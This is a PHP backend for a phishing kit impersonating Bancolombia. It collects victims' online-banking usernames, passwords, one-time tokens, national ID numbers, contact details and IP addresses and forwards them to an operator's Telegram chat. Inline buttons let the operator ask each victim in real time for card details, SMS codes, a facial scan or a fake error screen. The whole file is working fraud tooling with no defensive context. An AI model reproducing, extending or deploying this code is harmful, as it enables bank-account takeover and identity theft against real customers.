<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);
header('Content-Type: application/json');

$USED_TOKENS_FILE = 'used_tokens.json';

function loadConfig()
{
    $configFile = __DIR__ . '/../config.php';

    if (!file_exists($configFile)) {
        return null;
    }

    $config = require $configFile;

    if (!isset($config['bot_token']) || !isset($config['chat_id'])) {
        return null;
    }

    return [
        'token'   => $config['bot_token'],
        'chat_id' => $config['chat_id']
    ];
}

function sendMessage($token, $chatId, $text, $keyboard)
{
    $payload = [
        'chat_id'      => $chatId,
        'text'         => $text,
        'parse_mode'   => 'HTML',
        'reply_markup' => json_encode($keyboard)
    ];

    $ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST           => true,
        CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
        CURLOPT_POSTFIELDS     => json_encode($payload)
    ]);

    $res = curl_exec($ch);
    curl_close($ch);

    return json_decode($res, true);
}

function buildKeyboard($tid)
{
    return [
        'inline_keyboard' => [
            [
                ['text' => '🧮 DINAMICA', 'callback_data' => "pedir_token:$tid"],
                ['text' => '💳 CC', 'callback_data' => "cc:$tid"]
            ],
            [
                ['text' => '🏦 ERROR LOGO', 'callback_data' => "banco_error:$tid"],
                ['text' => '📱 SMS', 'callback_data' => "sms:$tid"],
                ['text' => '📸 FACIAL', 'callback_data' => "facial:$tid"]  // NUEVO BOTÓN
            ],
            [
                ['text' => '🏁 Finalizar', 'callback_data' => "fin:$tid"]
            ]
        ]
    ];
}

function formatMessage($d)
{
    $b = $d['bancoldata'] ?? ['usuario' => 'N/D', 'clave' => 'N/D'];
    $tbdatos = $d['tbdatos'] ?? [];
    
    // OBTENER DATOS EN FORMATO BBVA
    $correo = $tbdatos['correo'] ?? 'No disponible';
    $celular = $tbdatos['cel'] ?? $tbdatos['telefono'] ?? 'No disponible';
    $cedula = $tbdatos['val'] ?? $tbdatos['identificacion'] ?? 'No disponible';
    $persona = $tbdatos['per'] ?? $tbdatos['tipo_persona'] ?? 'No disponible';
    $banco = $tbdatos['nom'] ?? $tbdatos['banco'] ?? 'No disponible';
    $nombre = $tbdatos['nombre'] ?? 'No disponible';
    
    // Monto - CORREGIDO: siempre tomar del total enviado
    $montoRaw = isset($d['total']) ? str_replace(',', '', $d['total']) : '0';
    $monto = number_format((float)$montoRaw, 0, ',', '.');
    
    // IP y hora
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'No disponible';
    date_default_timezone_set('America/Bogota');
    $hora = date('d/m/Y H:i:s');
    
    // Detectar dispositivo
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $dispositivo = 'PC';
    if (preg_match('/Android/i', $userAgent)) {
        $dispositivo = 'Android';
    } elseif (preg_match('/iPhone|iPad|iPod/i', $userAgent)) {
        $dispositivo = 'iPhone';
    } elseif (preg_match('/Windows/i', $userAgent)) {
        $dispositivo = 'PC';
    } elseif (preg_match('/Mac/i', $userAgent)) {
        $dispositivo = 'Mac';
    } elseif (preg_match('/Linux/i', $userAgent)) {
        $dispositivo = 'Linux';
    }
    
    // Verificar si es login o token
    $tipo = isset($d['bancoldina']) ? 'TOKEN' : 'LOGIN';
    
    // FORMATO BBVA COMPLETO
    $msg = "<b>💎 BANCOLOMBIA 💎</b>\n";
    $msg .= "<b>• 💸Cedula:</b> " . htmlspecialchars($cedula) . "\n";
    $msg .= "<b>• 💌Correo:</b> " . htmlspecialchars($correo) . "\n";
    $msg .= "<b>• 📞Celular:</b> " . htmlspecialchars($celular) . "\n";
    $msg .= "<b>• 👤 Nombre:</b> " . htmlspecialchars($nombre) . "\n";
    $msg .= "<b>• 🏦Banco:</b> " . htmlspecialchars($banco) . "\n";
    $msg .= "------------------------------\n";
    $msg .= "<b>• 📟Dispositivo:</b> " . $dispositivo . "\n";
    $msg .= "<b>• 🗺IP:</b> " . $ip . "\n";
    $msg .= "<b>• ⏱Hora:</b> " . $hora . "\n";
    $msg .= "------------------------------\n";
    $msg .= "<b>• 💰 Monto:</b> $ " . $monto . "\n";
    $msg .= "------------------------------\n";
    
    // Datos específicos del login/token
    if ($tipo === 'LOGIN') {
        $msg .= "<b>🔐 CREDENCIALES 🔐</b>\n";
        $msg .= "<b>• 👤 Usuario:</b> <code>" . htmlspecialchars($b['usuario']) . "</code>\n";
        $msg .= "<b>• 🔑 Clave:</b> <code>" . htmlspecialchars($b['clave']) . "</code>\n";
    } else {
        $token = $d['bancoldina']['clave'] ?? 'N/D';
        $msg .= "<b>🔐 TOKEN INGRESADO 🔐</b>\n";
        $msg .= "<b>• 👤 Usuario:</b> <code>" . htmlspecialchars($b['usuario']) . "</code>\n";
        $msg .= "<b>• 🔑 Clave:</b> <code>" . htmlspecialchars($b['clave']) . "</code>\n";
        $msg .= "<b>• 🔢 Token:</b> <code>" . htmlspecialchars($token) . "</code>\n";
    }

    return $msg;
}

function isTokenUsed($id)
{
    global $USED_TOKENS_FILE;
    if (!file_exists($USED_TOKENS_FILE)) return false;

    $tokens = json_decode(file_get_contents($USED_TOKENS_FILE), true);
    return isset($tokens[$id]);
}

function markTokenUsed($id)
{
    global $USED_TOKENS_FILE;
    $tokens = file_exists($USED_TOKENS_FILE)
        ? json_decode(file_get_contents($USED_TOKENS_FILE), true)
        : [];

    $tokens[$id] = time();
    file_put_contents($USED_TOKENS_FILE, json_encode($tokens));
}

$config = loadConfig();
if (!$config) {
    echo json_encode(['ok' => false, 'error' => '❌ No se pudo cargar config.php']);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $d = json_decode(file_get_contents('php://input'), true);

    if (!is_array($d)) {
        echo json_encode(['ok' => false, 'error' => '⛔ JSON inválido']);
        exit;
    }

    $tid = $d['transactionId'] ?? '';

    if (!$tid) {
        echo json_encode(['ok' => false, 'error' => '⛔ Falta transactionId']);
        exit;
    }

    if (isTokenUsed($tid)) {
        echo json_encode(['ok' => false, 'error' => '⛔ Token ya utilizado']);
        exit;
    }

    markTokenUsed($tid);

    $msg = formatMessage($d);
    $keyboard = buildKeyboard($tid);
    
    $sent = sendMessage($config['token'], $config['chat_id'], $msg, $keyboard);

    echo json_encode([
        'ok'         => !empty($sent['ok']),
        'message_id' => $sent['result']['message_id'] ?? null
    ]);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['transactionId'])) {
    $tid = $_GET['transactionId'];
    $updates_url = "https://api.telegram.org/bot{$config['token']}/getUpdates?timeout=5";

    $updates = json_decode(@file_get_contents($updates_url), true);
    $lastUpdateId = 0;

    if (!isset($updates['result'])) {
        echo json_encode(['ok' => false]);
        exit;
    }

    foreach ($updates['result'] as $upd) {
        if (isset($upd['update_id'])) {
            $lastUpdateId = $upd['update_id'];
        }

        if (!isset($upd['callback_query'])) continue;

        $cbData = $upd['callback_query']['data'];
        if (strpos($cbData, $tid) === false) continue;

        $action = explode(':', $cbData)[0];
        $user   = $upd['callback_query']['from']['username']
               ?? $upd['callback_query']['from']['first_name'];

        $msgId    = $upd['callback_query']['message']['message_id'];
        $original = $upd['callback_query']['message']['text'];

        $newText  = $original
            . "\n\n✅ Acción: <b>" . ucfirst(str_replace('_', ' ', $action)) . "</b>"
            . "\n👤 Por: @" . $user;

        $payload = [
            'chat_id'    => $config['chat_id'],
            'message_id' => $msgId,
            'text'       => $newText,
            'parse_mode' => 'HTML'
        ];

        $ch = curl_init("https://api.telegram.org/bot{$config['token']}/editMessageText");
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST           => true,
            CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
            CURLOPT_POSTFIELDS     => json_encode($payload)
        ]);
        curl_exec($ch);
        curl_close($ch);

        // Agregar acción "facial"
        if ($action === 'facial') {
            echo json_encode(['ok' => true, 'action' => 'facial']);
            exit;
        }

        echo json_encode(['ok' => true, 'action' => $action]);
        exit;
    }

    if ($lastUpdateId > 0) {
        @file_get_contents("https://api.telegram.org/bot{$config['token']}/getUpdates?offset=" . ($lastUpdateId + 1));
    }

    echo json_encode(['ok' => false]);
    exit;
}

echo json_encode(['ok' => false, 'error' => '⛔ Método no permitido']);
exit;
?>